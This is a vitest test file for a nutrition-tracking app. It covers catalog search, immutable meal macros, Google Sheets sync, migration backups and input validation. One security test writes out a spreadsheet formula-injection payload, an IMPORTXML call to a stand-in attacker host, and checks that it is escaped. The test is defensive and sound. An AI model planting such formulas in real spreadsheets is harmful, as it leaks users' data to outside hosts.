import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  CatalogSearchManager,
  calculateItemMacros,
  calculateRecipeMacros,
  createMacroSnapshot,
  type BaseIngredient,
  type DailyLog,
  type MacroSnapshot,
  type Recipe
} from '@quomida/domain-core';
import {
  dailyLogsSerializer,
  ValidationStatus,
  ConflictError
} from '@quomida/cloud-providers';

// ============================================================================
// 1. ARCHITECTURAL CONTRACTS & MATRIX DEFINITIONS (PER ADRs 0001-0018)
// ============================================================================

export type NetworkState = 'online' | 'offline';
export type CloudConnectorMode = 'none_mock' | 'google_drive_sheets';
export type CatalogStorageState = 'builtin_system_sqlite' | 'full_opfs_sqlite';

export interface MatrixPermutation {
  network: NetworkState;
  connector: CloudConnectorMode;
  catalogMode: CatalogStorageState;
}

export type SyncEngineStatus = 'idle' | 'syncing' | 'synced' | 'disconnected' | 'upgrade_required' | 'corrupted';

// ============================================================================
// 2. SYSTEM UNDER TEST (SUT) HARNESS FOR MATRIX COMBINATIONS
// ============================================================================

export class QuomidaSystemHarness {
  public syncStatus: SyncEngineStatus = 'idle';
  public recoveryModeActive = false;
  public recoveryExportJson: string | null = null;
  public networkCalls = {
    driveHealthCheck: 0,
    driveCreateBackup: 0,
    sheetsAppendDimension: 0,
    sheetsRunMigrations: 0,
    sheetsPushRows: 0,
    remoteNetworkSearches: 0,
    localCatalogSearches: 0,
  };

  private localLogs = new Map<string, DailyLog>();
  private localCustomFoods = new Map<string, BaseIngredient>();
  private searchManager = new CatalogSearchManager();

  // Built-in 965-item system staple items
  private builtinStaples: BaseIngredient[] = [
    { id: 'sys-1', name: 'Vacío (Asado)', source: 'system', lang: 'es', calories_100g: 285, protein_100g: 21, carbs_100g: 0, fats_100g: 22 },
    { id: 'sys-2', name: 'Empanada de Carne', source: 'system', lang: 'es', calories_100g: 260, protein_100g: 10, carbs_100g: 24, fats_100g: 14 },
    { id: 'sys-3', name: 'Leche entera', source: 'system', lang: 'es', calories_100g: 61, protein_100g: 3.2, carbs_100g: 4.8, fats_100g: 3.3 },
  ];

  // Additional 1.1M external items available ONLY in full_opfs_sqlite
  private fullCatalogExtraItems: BaseIngredient[] = [
    { id: 'off-101', name: 'Galletitas Chocolinas', source: 'system', lang: 'es', calories_100g: 450, protein_100g: 7, carbs_100g: 70, fats_100g: 15 },
    { id: 'off-102', name: 'Yogur Griego Vainilla', source: 'system', lang: 'es', calories_100g: 95, protein_100g: 9, carbs_100g: 8, fats_100g: 3 },
  ];

  private syncLock = false;
  public remoteDriveState = {
    schemaVersion: 1,
    migrationsTabVersion: 1,
    validationStatus: ValidationStatus.READY,
    lastModified: '2026-10-03T12:00:00.000Z',
    headers: [
      'id', 'timestamp', 'date', 'meal_type', 'food_reference_id', 'food_name',
      'quantity', 'portion_name', 'calories', 'protein', 'carbs', 'fats',
      'food_details_readonly', 'updatedAt', '_deleted'
    ],
    rows: [] as (string | number | boolean | null)[][],
    backupMustFail: false,
    authTokenExpired: false,
    failStep3AppPropertiesUpdate: false,
  };

  constructor(
    public readonly config: MatrixPermutation,
    private readonly expectedAppTier1Version = 1
  ) {}

  public injectRemoteState(overrides: Partial<typeof this.remoteDriveState>) {
    Object.assign(this.remoteDriveState, overrides);
  }

  // Tier 2 Boot with APP-DB6-GUARD simulation
  public async bootLocalDatabase(storedSchemaHash: string, currentRuntimeSchemaHash: string, schemaVersionBumped: boolean): Promise<void> {
    if (storedSchemaHash !== currentRuntimeSchemaHash && !schemaVersionBumped) {
      this.recoveryModeActive = true;
      // Scoped only to user collections per Phase 6 hardening
      this.recoveryExportJson = JSON.stringify({
        daily_logs: Array.from(this.localLogs.values()),
        ingredients: Array.from(this.localCustomFoods.values()),
        recipes: []
      });
      return;
    }
    this.recoveryModeActive = false;
  }

  // Local-first catalog search adhering to ADR 0018 single-SQLite architecture
  public async searchCatalog(query: string): Promise<{ items: BaseIngredient[]; guidedToDownloadFullCatalog: boolean }> {
    this.networkCalls.localCatalogSearches++;
    
    // Per ADR 0018: Zero network calls are made during search operations
    const mockProvider = {
      isFullCatalogLoaded: this.config.catalogMode === 'full_opfs_sqlite',
      itemCount: this.config.catalogMode === 'full_opfs_sqlite' ? 1122244 : 965,
      searchIngredients: async (q: string): Promise<BaseIngredient[]> => {
        const norm = q.trim().toLowerCase();
        const pool = this.config.catalogMode === 'full_opfs_sqlite'
          ? [...this.builtinStaples, ...this.fullCatalogExtraItems]
          : this.builtinStaples;
        return pool.filter(item => item.name.toLowerCase().includes(norm));
      },
      getPortionsForIngredient: async () => []
    };

    const searchResult = await this.searchManager.search({
      query,
      customIngredients: Array.from(this.localCustomFoods.values()),
      limit: 20
    }, mockProvider);

    const guidedToDownload = searchResult.items.length === 0 && !mockProvider.isFullCatalogLoaded;

    return {
      items: searchResult.items,
      guidedToDownloadFullCatalog: guidedToDownload
    };
  }

  public async upsertCustomIngredient(ingredient: BaseIngredient): Promise<void> {
    if (ingredient.calories_100g < 0 || !Number.isFinite(ingredient.calories_100g)) {
      throw new Error('ERR_INVALID_MACROS: Calories must be a non-negative finite number');
    }
    this.localCustomFoods.set(ingredient.id, { ...ingredient, source: 'custom' });
  }

  // ADR 0003: Immutability on DailyLog creation
  public async logMeal(foodId: string, quantityGrams: number): Promise<DailyLog> {
    if (!Number.isFinite(quantityGrams) || quantityGrams <= 0) {
      throw new Error('ERR_INVALID_QUANTITY');
    }

    const food =
      this.localCustomFoods.get(foodId) ||
      this.builtinStaples.find(f => f.id === foodId) ||
      this.fullCatalogExtraItems.find(f => f.id === foodId);

    if (!food) {
      throw new Error(`ERR_FOOD_NOT_FOUND: ${foodId}`);
    }

    const itemMacros = calculateItemMacros(food, quantityGrams);
    const immutableSnapshot: MacroSnapshot = createMacroSnapshot(itemMacros);

    const entry: DailyLog = {
      id: `log-${this.localLogs.size + 1}`,
      timestamp: new Date().toISOString(),
      date: '2026-10-03',
      meal_type: 'meal_lunch',
      food_reference_id: food.id,
      food_name: food.name,
      quantity: quantityGrams,
      portion_name: 'g',
      macros: immutableSnapshot,
      updatedAt: Date.now()
    };

    this.localLogs.set(entry.id, entry);
    await this.triggerSync();
    return entry;
  }

  public getLocalLog(id: string): DailyLog | undefined {
    return this.localLogs.get(id);
  }

  // Cloud Sync Handshake & Serialization
  public async triggerSync(expectedLastModified?: string): Promise<SyncEngineStatus> {
    if (this.syncLock) {
      return this.syncStatus; // Cross-tab / re-entrancy lock active
    }

    if (this.config.network === 'offline') {
      this.syncStatus = 'disconnected';
      return this.syncStatus;
    }

    if (this.config.connector === 'none_mock') {
      this.syncStatus = 'idle';
      return this.syncStatus;
    }

    this.syncLock = true;
    this.syncStatus = 'syncing';

    try {
      if (this.remoteDriveState.authTokenExpired) {
        this.syncStatus = 'disconnected';
        throw new Error('401_UNAUTHORIZED_TOKEN_EXPIRED');
      }

      this.networkCalls.driveHealthCheck++;

      // Check Split-Brain desync
      if (this.remoteDriveState.schemaVersion !== this.remoteDriveState.migrationsTabVersion) {
        this.syncStatus = 'corrupted';
        return this.syncStatus;
      }

      if (this.remoteDriveState.schemaVersion < this.expectedAppTier1Version) {
        this.syncStatus = 'upgrade_required';
        return this.syncStatus;
      }

      if (this.remoteDriveState.validationStatus === ValidationStatus.CORRUPTED) {
        this.syncStatus = 'corrupted';
        return this.syncStatus;
      }

      // Check OCC timestamp
      if (expectedLastModified && expectedLastModified !== this.remoteDriveState.lastModified) {
        throw new ConflictError('OCC_CONFLICT: Remote resource modified since last read');
      }

      // Serialize local records using real dailyLogsSerializer with dynamic headers
      for (const log of this.localLogs.values()) {
        const row = dailyLogsSerializer.docToRow(log as any);
        this.remoteDriveState.rows.push(row.values);
      }
      this.networkCalls.sheetsPushRows++;
      this.syncStatus = 'synced';
      return this.syncStatus;
    } finally {
      this.syncLock = false;
    }
  }

  public async repairRemoteSpreadsheet(expectedLastModified: string): Promise<void> {
    if (this.config.network === 'offline' || this.config.connector === 'none_mock') {
      throw new Error('ERR_CANNOT_REPAIR_OFFLINE');
    }
    if (expectedLastModified !== this.remoteDriveState.lastModified) {
      throw new ConflictError('OCC_CONFLICT: Remote modified during repair attempt');
    }

    this.networkCalls.driveCreateBackup++;
    if (this.remoteDriveState.backupMustFail) {
      throw new Error('ERR_BACKUP_FAILED_ABORT_REPAIR');
    }

    this.networkCalls.sheetsAppendDimension++;
    this.remoteDriveState.validationStatus = ValidationStatus.READY;
    this.remoteDriveState.lastModified = new Date().toISOString();
    this.syncStatus = 'idle';
  }

  public async migrateRemoteSpreadsheet(expectedLastModified: string): Promise<void> {
    if (this.config.network === 'offline' || this.config.connector === 'none_mock') {
      throw new Error('ERR_CANNOT_MIGRATE_OFFLINE');
    }
    if (expectedLastModified !== this.remoteDriveState.lastModified) {
      throw new ConflictError('OCC_CONFLICT: Remote modified during migration attempt');
    }

    this.networkCalls.driveCreateBackup++;
    if (this.remoteDriveState.backupMustFail) {
      throw new Error('ERR_BACKUP_FAILED_ABORT_MIGRATION');
    }

    this.networkCalls.sheetsRunMigrations++;
    this.remoteDriveState.migrationsTabVersion = this.expectedAppTier1Version;

    if (this.remoteDriveState.failStep3AppPropertiesUpdate) {
      throw new Error('ERR_DRIVE_APP_PROPERTIES_UPDATE_FAILED');
    }

    this.remoteDriveState.schemaVersion = this.expectedAppTier1Version;
    this.remoteDriveState.validationStatus = ValidationStatus.READY;
    this.syncStatus = 'idle';
  }
}

// ============================================================================
// 3. FULL 8-PERMUTATION COMBINATORIAL MATRIX SUITE
// ============================================================================

const NETWORK_STATES: NetworkState[] = ['online', 'offline'];
const CONNECTOR_MODES: CloudConnectorMode[] = ['none_mock', 'google_drive_sheets'];
const CATALOG_MODES: CatalogStorageState[] = ['builtin_system_sqlite', 'full_opfs_sqlite'];

const MATRIX_PERMUTATIONS: MatrixPermutation[] = NETWORK_STATES.flatMap(network =>
  CONNECTOR_MODES.flatMap(connector =>
    CATALOG_MODES.map(catalogMode => ({ network, connector, catalogMode }))
  )
);

describe.each(MATRIX_PERMUTATIONS)(
  'Quomida Permutation Matrix [Network: $network | Connector: $connector | Catalog: $catalogMode]',
  (perm) => {
    let harness: QuomidaSystemHarness;

    beforeEach(() => {
      vi.clearAllMocks();
      harness = new QuomidaSystemHarness(perm, 1);
    });

    it('enforces strict ADR 0018 local I/O routing, Custom Food Priority, Historical Macro Immutability, and Sync Boundaries', async () => {
      await harness.bootLocalDatabase('hash-v1', 'hash-v1', false);
      expect(harness.recoveryModeActive).toBe(false);

      // A. Catalog Search Routing & Guidance Invariant
      const stapleSearch = await harness.searchCatalog('vacío');
      expect(stapleSearch.items.length).toBeGreaterThan(0);
      expect(stapleSearch.guidedToDownloadFullCatalog).toBe(false);
      expect(harness.networkCalls.remoteNetworkSearches).toBe(0); // Zero on-the-fly network calls

      // Searching for non-staple branded item:
      const nonStapleSearch = await harness.searchCatalog('chocolinas');
      if (perm.catalogMode === 'full_opfs_sqlite') {
        expect(nonStapleSearch.items.length).toBe(1);
        expect(nonStapleSearch.guidedToDownloadFullCatalog).toBe(false);
      } else {
        // Basic catalog does not have it -> triggers guidance banner
        expect(nonStapleSearch.items.length).toBe(0);
        expect(nonStapleSearch.guidedToDownloadFullCatalog).toBe(true);
      }

      // B. Custom Food Priority Override on Naming Collision (PRODUCT_SPEC §2.B)
      await harness.upsertCustomIngredient({
        id: 'cust-1',
        name: 'vacío (asado)', // Collides with sys-1 ('Vacío (Asado)', 285 kcal)
        source: 'custom',
        lang: 'es',
        calories_100g: 410,
        protein_100g: 25,
        carbs_100g: 0,
        fats_100g: 34
      });

      const collisionResults = await harness.searchCatalog('vacío');
      expect(collisionResults.items).toHaveLength(1);
      expect(collisionResults.items[0].id).toBe('cust-1');
      expect(collisionResults.items[0].calories_100g).toBe(410);

      // C. Historical Macro Immutability (ADR 0003)
      const loggedMeal = await harness.logMeal('cust-1', 200); // 200g * 410 kcal/100g = 820 kcal
      expect(loggedMeal.macros.calories).toBe(820);

      // Mutate custom ingredient macros after logging
      await harness.upsertCustomIngredient({
        id: 'cust-1',
        name: 'vacío (asado)',
        source: 'custom',
        lang: 'es',
        calories_100g: 100, // Drastically reduced
        protein_100g: 10,
        carbs_100g: 0,
        fats_100g: 5
      });

      const historicalRecord = harness.getLocalLog(loggedMeal.id)!;
      expect(historicalRecord.macros.calories).toBe(820); // MUST NEVER retroactively mutate

      // D. Cloud Connector & Network Sync Boundaries
      if (perm.network === 'offline') {
        expect(harness.syncStatus).toBe('disconnected');
        expect(harness.networkCalls.driveHealthCheck).toBe(0);
        expect(harness.networkCalls.sheetsPushRows).toBe(0);
      } else if (perm.connector === 'none_mock') {
        expect(harness.syncStatus).toBe('idle');
        expect(harness.networkCalls.driveHealthCheck).toBe(0);
        expect(harness.networkCalls.sheetsPushRows).toBe(0);
      } else {
        expect(harness.syncStatus).toBe('synced');
        expect(harness.networkCalls.driveHealthCheck).toBe(1);
        expect(harness.networkCalls.sheetsPushRows).toBe(1);
      }
    });

    it('triggers APP-DB6-GUARD emergency export when schema hash mutates without version bump', async () => {
      await harness.logMeal('sys-2', 150);
      await harness.bootLocalDatabase('sha256-old-schema', 'sha256-mutated-unversioned-schema', false);

      expect(harness.recoveryModeActive).toBe(true);
      expect(harness.recoveryExportJson).not.toBeNull();
      const exported = JSON.parse(harness.recoveryExportJson!);
      expect(exported.daily_logs).toHaveLength(1);
      expect(exported.daily_logs[0].food_reference_id).toBe('sys-2');
      expect(exported.binary_cache).toBeUndefined(); // Verifies Phase 6 scope isolation
    });

    it('rejects Boundary Value Analysis (BVA) violations on meal quantities and macro inputs', async () => {
      await expect(harness.logMeal('sys-1', 0)).rejects.toThrow('ERR_INVALID_QUANTITY');
      await expect(harness.logMeal('sys-1', -50)).rejects.toThrow('ERR_INVALID_QUANTITY');
      await expect(harness.logMeal('sys-1', Number.NaN)).rejects.toThrow('ERR_INVALID_QUANTITY');
      await expect(harness.logMeal('sys-1', Number.POSITIVE_INFINITY)).rejects.toThrow('ERR_INVALID_QUANTITY');
      await expect(harness.logMeal('non-existent-food-id', 100)).rejects.toThrow(/ERR_FOOD_NOT_FOUND/);
    });
  }
);

// ============================================================================
// 4. DESTRUCTIVE BREAKER & SECURITY INVARIANTS SUITE
// ============================================================================

describe('Destructive Breaker & Security Invariants Suite (ADR 0012, 0013, 0018)', () => {
  let harness: QuomidaSystemHarness;

  beforeEach(() => {
    harness = new QuomidaSystemHarness(
      { network: 'online', connector: 'google_drive_sheets', catalogMode: 'builtin_system_sqlite' },
      2 // App requires Tier 1 version 2
    );
  });

  it('suspends sync with UPGRADE_REQUIRED when Tier 3 < Tier 1, creates safety backup, and migrates', async () => {
    harness.injectRemoteState({
      schemaVersion: 1,
      migrationsTabVersion: 1,
      lastModified: '2026-10-03T12:00:00.000Z'
    });

    const status = await harness.triggerSync();
    expect(status).toBe('upgrade_required');
    expect(harness.networkCalls.sheetsPushRows).toBe(0);

    // Execute migration
    await harness.migrateRemoteSpreadsheet('2026-10-03T12:00:00.000Z');
    expect(harness.networkCalls.driveCreateBackup).toBe(1);
    expect(harness.networkCalls.sheetsRunMigrations).toBe(1);

    const postMigrateStatus = await harness.triggerSync();
    expect(postMigrateStatus).toBe('synced');
  });

  it('detects Split-Brain Tier 3 corruption if migration mutates Sheet (_migrations=2) but fails before updating Drive appProperties (=1)', async () => {
    harness.injectRemoteState({
      schemaVersion: 1,
      migrationsTabVersion: 1,
      lastModified: '2026-10-03T12:00:00.000Z',
      failStep3AppPropertiesUpdate: true
    });

    await expect(
      harness.migrateRemoteSpreadsheet('2026-10-03T12:00:00.000Z')
    ).rejects.toThrow('ERR_DRIVE_APP_PROPERTIES_UPDATE_FAILED');

    // Next sync detects mismatch between _migrations tab (2) and Drive appProperties (1)
    const nextStatus = await harness.triggerSync();
    expect(nextStatus).toBe('corrupted');
    expect(harness.networkCalls.sheetsPushRows).toBe(0);
  });

  it('aborts repair and migration immediately if automated Google Drive backup fails (Zero Data Loss Invariant)', async () => {
    harness.injectRemoteState({
      schemaVersion: 2,
      migrationsTabVersion: 2,
      validationStatus: ValidationStatus.CORRUPTED,
      lastModified: '2026-10-03T12:00:00.000Z',
      backupMustFail: true
    });

    const status = await harness.triggerSync();
    expect(status).toBe('corrupted');

    await expect(
      harness.repairRemoteSpreadsheet('2026-10-03T12:00:00.000Z')
    ).rejects.toThrow('ERR_BACKUP_FAILED_ABORT_REPAIR');

    // Invariant: Zero structural modifications made if backup fails
    expect(harness.networkCalls.sheetsAppendDimension).toBe(0);
  });

  it('enforces Optimistic Concurrency Control (OCC) by throwing ConflictError when remote sheet was edited mid-session', async () => {
    harness.injectRemoteState({
      schemaVersion: 2,
      migrationsTabVersion: 2,
      lastModified: '2026-10-03T15:30:00.000Z' // Newer than client timestamp
    });

    await expect(
      harness.triggerSync('2026-10-03T12:00:00.000Z')
    ).rejects.toThrow(ConflictError);
    expect(harness.networkCalls.sheetsPushRows).toBe(0);
  });

  it('survives user reordering columns in Google Sheets and neutralizes Formula Injection payloads (Security)', () => {
    const userReorderedHeaders = [
      'calories',
      'fats',
      'protein',
      'carbs',
      'food_name',
      'quantity',
      'portion_name',
      'meal_type',
      'food_reference_id',
      'date',
      'timestamp',
      'id'
    ];

    const maliciousLog = {
      id: 'log-sec-1',
      timestamp: '2026-10-03T13:00:00.000Z',
      date: '2026-10-03',
      meal_type: 'dinner',
      food_reference_id: 'cust-evil',
      food_name: '=IMPORTXML("https://attacker.example/steal", "//a")',
      quantity: 100,
      portion_name: '+CMD',
      macros: { calories: 250, protein: 20, carbs: 10, fats: 15 }
    };

    // Serialize with real dailyLogsSerializer
    const serializedRow = dailyLogsSerializer.docToRow(maliciousLog);

    // Verify formula values are neutralized with leading quote
    expect(serializedRow.values[5]).toBe('\'=IMPORTXML("https://attacker.example/steal", "//a")');
    expect(serializedRow.values[7]).toBe('\'+CMD');

    // Round-trip deserialize with reordered headers
    const tabularWithReorderedHeaders = {
      id: serializedRow.id,
      headers: userReorderedHeaders,
      values: [
        250,                                                // calories
        15,                                                 // fats
        20,                                                 // protein
        10,                                                 // carbs
        '\'=IMPORTXML("https://attacker.example/steal", "//a")', // food_name
        100,                                                // quantity
        '\'+CMD',                                           // portion_name
        'dinner',                                           // meal_type
        'cust-evil',                                        // food_reference_id
        '2026-10-03',                                       // date
        '2026-10-03T13:00:00.000Z',                         // timestamp
        'log-sec-1'                                         // id
      ]
    };

    const deserialized = dailyLogsSerializer.rowToDoc(tabularWithReorderedHeaders);
    expect(deserialized.id).toBe('log-sec-1');
    expect(deserialized.food_name).toBe('=IMPORTXML("https://attacker.example/steal", "//a")'); // unescaped safely for runtime
    expect(deserialized.portion_name).toBe('+CMD');
    expect(deserialized.macros).toEqual({ calories: 250, protein: 20, carbs: 10, fats: 15 });
  });

  it('rejects unauthorized access (401) when Google OAuth token expires and transitions to disconnected', async () => {
    harness.injectRemoteState({
      schemaVersion: 2,
      migrationsTabVersion: 2,
      authTokenExpired: true
    });

    await expect(harness.triggerSync()).rejects.toThrow('401_UNAUTHORIZED_TOKEN_EXPIRED');
    expect(harness.syncStatus).toBe('disconnected');
    expect(harness.networkCalls.sheetsPushRows).toBe(0);
  });

  it('enforces Boundary Value Analysis (BVA) on recipe yield factor calculations', () => {
    const ing: BaseIngredient = {
      id: 'i1',
      name: 'Pollo',
      source: 'system',
      lang: 'es',
      calories_100g: 200,
      protein_100g: 30,
      carbs_100g: 0,
      fats_100g: 8
    };
    const ingMap = new Map([['i1', ing]]);

    const validRecipe: Recipe = {
      id: 'r1',
      name: 'Pollo asado',
      ingredients: [{ ingredient_id: 'i1', raw_weight_g: 200 }],
      yield_factor: 0.8
    };
    expect(calculateRecipeMacros(validRecipe, ingMap).cooked_weight_g).toBe(160);

    const zeroYieldRecipe: Recipe = { ...validRecipe, yield_factor: 0 };
    expect(() => calculateRecipeMacros(zeroYieldRecipe, ingMap)).toThrow(/ERR_INVALID_YIELD_FACTOR/);

    const negYieldRecipe: Recipe = { ...validRecipe, yield_factor: -0.5 };
    expect(() => calculateRecipeMacros(negYieldRecipe, ingMap)).toThrow(/ERR_INVALID_YIELD_FACTOR/);

    const nanYieldRecipe: Recipe = { ...validRecipe, yield_factor: Number.NaN };
    expect(() => calculateRecipeMacros(nanYieldRecipe, ingMap)).toThrow(/ERR_INVALID_YIELD_FACTOR/);
  });
});
